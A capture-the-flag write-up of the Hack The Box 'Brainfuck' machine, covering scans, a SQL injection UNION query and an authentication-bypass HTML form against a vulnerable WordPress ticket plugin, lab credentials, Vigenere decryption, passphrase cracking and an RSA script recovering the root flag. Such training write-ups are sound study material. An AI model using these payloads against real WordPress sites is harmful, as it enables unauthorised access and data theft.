Title: HTB Brainfuck box writeup
Tags: oscp, htb, wordpress, wpscan, crypto, rsa, vigenere cipher
Summary: I love the smell of crypto in the morning
Date: 2020-10-20 20:20
Status: published

# Enumeration
Couple of interesting services are there:
```text
    Nmap 7.80 scan initiated Mon Oct 19 21:59:43 2020 as: nmap -sS -v -p- -oA enum/nmap-ss-all 10.10.10.17
    Nmap scan report for brainfuck.htb (10.10.10.17)
    Host is up (0.052s latency).
    Not shown: 65530 filtered ports
    PORT    STATE SERVICE
    22/tcp  open  ssh
    25/tcp  open  smtp
    110/tcp open  pop3
    143/tcp open  imap
    443/tcp open  https
    Read data files from: /usr/bin/../share/nmap
    Nmap done at Mon Oct 19 22:01:44 2020 -- 1 IP address (1 host up) scanned in 120.26 seconds
```
Detailed scan:
```text
    Nmap 7.80 scan initiated Mon Oct 19 22:03:05 2020 as: nmap -sC -sV -A -T4 -v -p22,25,110,143,443 -oA enum/nmap-sCVAT4-open 10.10.10.17
    Nmap scan report for brainfuck.htb (10.10.10.17)
    Host is up (0.052s latency).
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
    |   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
    |_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
    25/tcp  open  smtp     Postfix smtpd
    |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    110/tcp open  pop3     Dovecot pop3d
    |_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE PIPELINING CAPA TOP USER UIDL RESP-CODES
    143/tcp open  imap     Dovecot imapd
    |_imap-capabilities: OK ID have more Pre-login IMAP4rev1 LITERAL+ post-login AUTH=PLAINA0001 SASL-IR listed ENABLE LOGIN-REFERRALS capabilities IDLE
    443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
    |_http-generator: WordPress 4.7.3
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-server-header: nginx/1.10.0 (Ubuntu)
    |_http-title: Brainfuck Ltd. &#8211; Just another WordPress site
    | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
    | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
    | Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
    | Public Key type: rsa
    | Public Key bits: 3072
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2017-04-13T11:19:29
    | Not valid after:  2027-04-11T11:19:29
    | MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
    |_SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    | tls-nextprotoneg: 
    |_  http/1.1
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
    No exact OS matches for host (test conditions non-ideal).
    Uptime guess: 0.001 days (since Mon Oct 19 22:02:08 2020)
    Network Distance: 2 hops
    TCP Sequence Prediction: Difficulty=263 (Good luck!)
    IP ID Sequence Generation: All zeros
    Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    TRACEROUTE (using port 110/tcp)
    HOP RTT      ADDRESS
    1   50.80 ms 10.10.14.1
    2   50.37 ms brainfuck.htb (10.10.10.17)
    Read data files from: /usr/bin/../share/nmap
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Mon Oct 19 22:03:54 2020 -- 1 IP address (1 host up) scanned in 50.06 seconds
```
Certificate common name suggests that box hostname could be `brainfuck.htb` and
there are virtual hosts configured on the webserver since it responds with
different webpages to `https://10.10.10.17` and `https://brainfuck.htb`. It
seems that there's wordpress website at the `brainfuck.htb`.

Nikto on IP root:
```text
    Nikto v2.1.6/2.1.5
    Target Host: 10.10.10.17
    Target Port: 443
    GET The anti-clickjacking X-Frame-Options header is not present.
    GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    GET The site uses SSL and Expect-CT header is not present.
    GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    GET The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
    GET Hostname '10.10.10.17' does not match certificate's names: brainfuck.htb
    HEAD nginx/1.10.0 appears to be outdated (current is at least 1.14.0)
```

And on the domain root:
```text
    Nikto v2.1.6/2.1.5
    Target Host: brainfuck.htb
    Target Port: 443
    GET The anti-clickjacking X-Frame-Options header is not present.
    GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    GET Uncommon header 'link' found, with contents: <https://brainfuck.htb/?rest_route=/>; rel="https://api.w.org/"
    GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    GET The site uses SSL and Expect-CT header is not present.
    GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    GET The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
    HEAD nginx/1.10.0 appears to be outdated (current is at least 1.14.0)
    GET /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
    GET /readme.html: This WordPress file reveals the installed version.
    GET /wp-links-opml.php: This WordPress script reveals the installed version.
    OSVDB-3092: GET /license.txt: License file found may identify site software.
    GET /: A Wordpress installation was found.
    GET Cookie wordpress_test_cookie created without the httponly flag
    GET /wp-login.php: Wordpress login found
```

Gobuster with `big.txt` from dirb wasn't found any interesting entries at this
time.

Website has a certificate with interesting issuer:
```text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            8d:b8:17:98:7c:79:8f:87
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = GR, ST = Attica, L = Athens, O = Brainfuck Ltd., OU = IT, CN = brainfuck.htb, emailAddress = orestis@brainfuck.htb
        Validity
            Not Before: Apr 13 11:19:29 2017 GMT
            Not After : Apr 11 11:19:29 2027 GMT
        Subject: C = GR, ST = Attica, L = Athens, O = Brainfuck Ltd., OU = IT, CN = brainfuck.htb, emailAddress = orestis@brainfuck.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (3072 bit)
                Modulus:
                [SNIP]
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                8F:5D:8A:B1:C2:60:FF:A8:12:1F:39:BE:93:34:8D:FE:9B:2F:8A:4F
            X509v3 Authority Key Identifier: 
                keyid:8F:5D:8A:B1:C2:60:FF:A8:12:1F:39:BE:93:34:8D:FE:9B:2F:8A:4F
            X509v3 Basic Constraints: 
                CA:TRUE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment
            X509v3 Subject Alternative Name: 
                DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
    [SNIP]
```
It might be that there's a `orestis` user in this box. Also notice some
quite interesting value in SAN: `sup3rs3cr3t.brainfuck.htb`. Worth to be
added in `/etc/hosts`. Turned out there's some another web service called
`Super Secret Forum` - deployment of [Flarum](https://flarum.org):

![flarum](/cstatic/htb-brainfuck/secret-forum.png)

Wordpress contains some vulnerable plugin:

![wp support plugin](/cstatic/htb-brainfuck/wp-support-plus.png)

There are at least two vulnerabilities known to EDB:

 1. [Privesc to wp admin](https://www.exploit-db.com/exploits/41006)
 2. [SQLi](https://www.exploit-db.com/exploits/40939)

Found using wpscan with arguments
`--url https://brainfuck.htb -o enum/wpscan.txt -v --disable-tls-checks -e ap,at,cb,dbe --plugins-detection aggressive --detection-mode aggressive`

# Exploitation
wp-support-plus-responsive-ticket-system indeed looks vulnerable to SQLi, in my
case it was chained with privesc to wp-admin:

![sqli poc](/cstatic/htb-brainfuck/sqli-poc.png)

Admin password hash could be dumped that way:
`admin:$P$BAQpNTfe4/kWGQ9.j6Aia.Hw.VBs580`. The query:
`0+UNION+SELECT+1,CONCAT(user_login,CHAR(58),user_pass),3+FROM+wp_users`

To get into WP admin page I used such a simple HTML file, it's a bit changed
from PE PoC above:
```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
    Username: <input type="text" name="username" value="admin">
    <input type="hidden" name="email" value="orestis@brainfuck.htb">
    <input type="hidden" name="action" value="loginGuestFacebook">
    <input type="submit" value="Login">
</form>
```
Creds for local mail server spotted in plugin config (`orestis:kHGuERB29DNiNE`):

![mail creds](/cstatic/htb-brainfuck/smtp-pass.png)

These creds allows to read mail for orestis, and there's an interesting letter
with another credentials - for s3cr3tforum (`orestis:kIEnnfEKJ#9UmdO`):

![forum creds](/cstatic/htb-brainfuck/forum-creds.png)

There's an interesting conversation between orestis and admin, looks like
orestis is quite a d-bag and yelling on admin because he configured SSH access
to use key auth only. They have a 'secure' conversation with an interesting
string that seems to be the link to website on the box:
`mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr`. Also
since we have a some plaintest conversation along with the encrypted one we
likely have a crib - orestis append signature to every message. For a second I
was suspecting ROT\* 'ciphers' but as `mnvze://` likely maps to `https:` this
suggestion was deemed invalid - there were something like `mnnvze://` if this
hold true. By the trial and error and by taking into account that trailing part
of orestis messages is always the same it was discovered that they're 
encrypted with Vigenere cipher and key varies from line to line. For example,
`Mya qutf de buj otv rms dy srd vkdof` is encrypted with `fuckmybrain` key. The
nature of this cipher allows to perform trivial by-hand brute force since key
could be recovered char by char - incomplete one will render whole message
gibberish, but starting part will always be readable in case part of the key was
guessed right. Link to the SSH key was also encrypted with `fuckmybrain` key and
the plaintext is
`https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa`. It is
likely protected by passphrase since conversation suggests so.  
As suggested, there was a passprase that was easily cracked using notorious
rockyou.txt, the password is `3poulakia!`:

![ssh pass cracked](/cstatic/htb-brainfuck/ssh-passphrase.png)

This key is a way to user shell:

![user shell](/cstatic/htb-brainfuck/user-shell.png)

# Privilege escalation
Not a privilege escalation, but grabbing the root flag. There are some
interesting files in orestis home dir - `debug.txt`, `encrypt.sage` and
`output.txt`. Content of `encrypt.sage` suggests that `output.txt` contains
root flag encrypted with RSA and key is 1024 bits. `debug.txt` contains P, Q and
E that used in RSA encryption, `output.txt` contains encrypted root flag. After
a bit of googling it became clear that plaintext could be computed back, all
that's necessary is to compute decryption key using extended euclidean
algorithm. There's a lot of such a scripts online and I grabbed
[some](https://gist.github.com/intrd/3f6e8f02e16faa54729b9288a8f59582) from the
Gist:
```python
#!/usr/bin/python
## RSA - Given p,q and e.. recover and use private key w/ Extended Euclidean Algorithm - crypto150-what_is_this_encryption @ alexctf 2017
# @author intrd - http://dann.com.br/ (original script here: http://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

import binascii, base64

p = [SNIP]
q = [SNIP]
e = [SNIP]
ct = [SNIP]

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

n = p*q #product of primes
phi = (p-1)*(q-1) #modular multiplicative inverse
gcd, a, b = egcd(e, phi) #calling extended euclidean algorithm
d = a #a is decryption key

out = hex(d)
print("d_hex: " + str(out));
print("n_dec: " + str(d));

pt = pow(ct, d, n)
print("pt_dec: " + str(pt))

out = hex(pt)
out = str(out[2:-1])
print "flag"
print out.decode("hex")
```
It worked flawlessly with acquired numbers and computed root flag back which is
`6efc1a5dbb8904751ce656**********`
